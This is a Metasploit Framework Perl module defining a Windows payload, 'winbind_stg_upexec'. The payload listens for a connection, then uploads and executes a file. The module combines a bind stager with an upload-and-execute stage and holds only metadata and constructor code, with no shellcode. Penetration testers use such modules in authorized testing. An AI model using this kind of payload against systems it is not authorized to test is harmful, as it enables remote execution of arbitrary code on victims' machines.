
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_bind_stg_upexec;
use strict;
use base 'Msf::PayloadComponent::Win32UploadExecStage';
sub load {
  Msf::PayloadComponent::Win32UploadExecStage->import('Msf::PayloadComponent::Win32BindStager');
}

my $info =
{
  'Name'         => 'winbind_stg_upexec',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection then upload and exec file',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
